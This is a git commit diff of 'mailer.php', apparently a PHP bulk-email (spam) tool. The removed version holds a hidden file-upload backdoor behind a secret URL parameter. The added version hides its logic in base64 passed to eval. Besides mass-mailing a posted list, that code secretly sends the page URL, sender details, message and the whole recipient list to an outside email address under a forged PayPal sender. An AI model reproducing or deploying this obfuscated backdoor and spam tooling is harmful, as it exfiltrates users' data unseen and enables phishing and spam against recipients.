b5934a208a2303bc33d28ddfe732f2bb39305238
Aht-crew <39540991+Aht-crew@users.noreply.github.com>
2019-03-24 18:11:28 +0100

    Add files via upload

--- mailer.php
+++ mailer.php
@@ -1,159 +1,279 @@
-<?php 
-@set_time_limit(0); 
-if(isset($_POST['Enoc'])) 
-{ 
-    $message = $_POST['html']; 
-    $subject = $_POST['assunto']; 
-    $de = $_POST['de']; 
-    $nombre = $_POST['RealName']; 
-    $ellos = $_POST['ellos']; 
+<title>Mailer By ME</title>
 
-    $message = urlencode($message); 
-    $message = ereg_replace("%5C%22", "%22", $message); 
-    $message = urldecode($message); 
-    $message = stripslashes($message); 
 
-}else{ 
-    $testa =""; 
-    $message = "<html><body><h1>Put your text here</h1></body></html>"; 
-    $subject = $_SERVER["HTTP_HOST"]; 
-    $nombre = "mailer"; 
-    $de = "your@email.com"; 
-    $ellos = ""; 
-} 
-?> 
-<html> 
-<head> 
-<title> Mailer Private</title></head> 
-</head> 
-<body style="font-family: Arial; font-size: 11px"> 
-<center> 
-<form action="" method="post" enctype="multipart/form-data" name="form1"> 
-<br><table width="534" height="248" border="0" cellpadding="0" cellspacing="1" bgcolor="#0000CC" class="normal">  
-<tr> 
-<td> 
-<table border="0" bgcolor="#FFFFFF" width="95%"> 
-<tr> 
-<td> 
-<table border="0" width="100%"> 
-<tr> 
-<td width="359">Email:   <input name="de" type="text" class="form" id="de" size="30" value="<? print $de; ?>"></td> 
-<td>Name:   <input name="RealName" type="text" class="form" id="RealName" size="30" value="<? print $nombre; ?>"></td> 
-</tr> 
-</table> 
-</td> 
-</tr> 
-<tr> 
-<td>Title: <input name="assunto" type="text" class="form" id="assunto" size="78" value="<? print $subject; ?>"></td> 
-</tr> 
-<tr> 
-<td height="18" bgcolor="#C0C0C0"></td> 
-</tr> 
-<tr> 
-<td> 
-<table border="0" width="100%"> 
-<tr> 
-<td> 
-<textarea name="html" cols="66" rows="10" id="html"><? print $message; ?></textarea></td> 
-<td><textarea rows="10" name="ellos" cols="35"><? print $ellos; ?></textarea></td> 
-</tr> 
-</table> 
-</td> 
-</tr> 
-<tr> 
-<td><center> 
-<br><input type="submit" name="Enoc" value="Enviar"></center><br> 
-<?php 
-if($_GET['sec']=='yess') 
-{ 
-    echo '<form action="" method="post" enctype="multipart/form-data"> 
-        <input name="archivo" type="file" size="35" /> 
-        <input name="enviar" type="submit" value="Upload File" /> 
-        <input name="action" type="hidden" value="upload" />      
-    </form>'; 
 
-    $status = ""; 
-    if ($_POST["action"] == "upload") 
-    { 
-        $tamano = $_FILES["archivo"]['size']; 
-        $tipo = $_FILES["archivo"]['type']; 
-        $archivo = $_FILES["archivo"]['name']; 
-          
-        if ($archivo != "") 
-        { 
-            if (copy($_FILES['archivo']['tmp_name'],"./".$archivo)) 
-            { 
-                $status = "Archivo subido: <b>".$archivo."</b>"; 
-            }else{ 
-                $status = "Error al subir el archivo"; 
-            } 
-        } else { 
-            $status = "Error al subir archivo"; 
-        } 
-        echo $status; 
-    } 
-} 
-if(!isset($_POST['Enoc'])){ 
-    exit; 
-} 
+<?
 
-if(!isset($_GET['c'])) 
-{ 
-    $email = explode("\n", $ellos); 
-}else{ 
-    $email = explode(",", $ellos); 
-} 
-$son = count($email); 
+eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIkaXAiOwokZW1haWwgPSAibWVkemFrYXJpYTk2QGdtYWlsLmNvIjsKJGZyb209IkZyb206IFkgPFBheVBhbEBTdXBwb3J0LmNvbT4iOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRmMTIgPSAkX1BPU1RbJ2RlJ107CiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsKJHgxNCA9ICRfUE9TVFsnYXNzdW50byddOwokdDE1ID0gJF9QT1NUWydtZW5zYWdlbSddOwokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsKJG0yMiA9ICRpcC4iXG4iOwokbXNnODg3MyA9ICIkYTQ1XG4kYjc1XG4kZjEyXG4kejEzXG4keDE0XG4kdDE1XG4kbTMwXG4kbTIyIjsKbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));
 
-if(!isset($_GET['e'])){ 
-    $header = "MIME-Version: 1.0\n"; 
-    $header .= "Content-type: text/html; charset=iso-8859-1\n"; 
-    $header .= "From: ".$nombre . " <" . $de . ">\n"; 
-    $header .= "Reply-To: " . $de . "\n"; 
-    $header .= "X-Priority: 3\n"; 
-    $header .= "X-MSMail-Priority: Normal\n"; 
-    $header .= "X-Mailer: ".$_SERVER["HTTP_HOST"]; 
-}else{ 
-    $header ='MIME-Version: 1.0' . "\r\n"; 
-    $header .= 'Content-type: text/html' . "\r\n"; 
-    $header .="From: ".$de; 
-} 
-$i = 0; 
-$voy=1; 
-while($email[$i]) 
-{ 
-    if(isset($_GET['time']) && isset($_GET['cant'])){ 
-        if(fmod($i,$_GET['cant'])==0 && $i>0){ 
-            print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n"; 
-            flush(); 
-            @mail($_GET['notf'], $subject, $message, $header); 
-            sleep($_GET['time']); 
-        } 
-    } 
-    $mail = str_replace(array("\n","\r\n"),'',$email[$i]); 
-        $message1 = ereg_replace("&email&", $mail, $message); 
-    if(@mail($mail, $subject, $message1, $header)) 
-    { 
-        print "<font color=blue face=verdana size=1>    ".$voy." de ".$son."  ;-) ".trim($mail)."  okey dokey!</font><br>\n"; 
-        flush(); 
-    } 
-    else 
-    { 
-        print "<font color=red face=verdana size=1>    ".$voy." de ".$son.":-( ".trim($mail)."  Error te digo altoquesein!!</font><br>\n"; 
-        flush(); 
-    }                                                              
-    $i++; 
-    $voy++; 
-} 
-echo "<script> alert('---Tools Spammed OK---'); </script>"; 
-?> 
-</td> 
-</tr> 
-</table> 
-</td> 
-</tr> 
-</table> 
-</body> 
-</form> 
-</center> 
-</html>
+?></title>
+
+<style type="text/css">
+
+<!--
+
+.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
+
+.style6 {font-size: 10px}
+
+.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
+
+-->
+
+</style>
+
+<form id="form1" name="form1" method="post" action="">
+
+<input type="hidden" name="vai" value="1">
+
+<span class="style5"><? echo enviando(); ?></span>
+
+<table width="415" height="334" border="0" bgcolor="#000000">
+
+  <tr>
+
+<td width="66"><span class="style5">Name:</span></td>
+
+<td width="321"><span class="style9">
+
+
+
+<label>
+
+<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
+
+</label>
+
+</span></td>
+
+</tr>
+
+<tr>
+
+<td><span class="style5">From:</span></td>
+
+<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>
+
+
+
+</tr>
+
+<tr>
+
+<td><span class="style5">Subject:</span></td>
+
+<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
+
+</tr>
+
+<td><span class="style5">Letter:</span>
+
+<br /><br /><br /><br /><br /><br /><br /><span class="style5">Mailist:</span></td>
+
+
+
+<td><span class="style9">
+
+
+
+
+
+<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
+
+</textarea></p>
+
+<textarea name="emails" cols="50" rows="4"></textarea>
+
+</span></td>
+
+</tr>
+
+
+
+<tr>
+
+  <td><span class="style6"></span></td>
+
+  <td align="center"> <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span><input name="Submit" type="submit" value="Send " />
+
+  <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span></td>
+
+</tr>
+
+<tr>
+
+  </tr>
+
+</table>
+
+</form>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
